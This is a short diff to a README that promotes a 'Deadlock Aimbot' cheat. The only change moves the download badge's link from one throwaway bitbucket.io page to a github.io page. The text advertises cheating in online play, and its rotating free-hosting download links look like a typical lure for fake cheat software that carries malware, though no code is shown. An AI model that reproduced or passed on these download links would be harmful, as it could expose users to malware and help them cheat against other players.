@@ -4,7 +4,7 @@ Deadlock is fast, punishing, and sweaty — blink and you're dead. But what if y
 
 Perfect for climbing ranked, frag movie farming, or just wiping squads without missing a shot 😎.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload13.bitbucket.io)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://Deadlock-Aimbot-pined.github.io/.github)
 ---
 
 ## 🎯 What Is the Deadlock Aimbot?
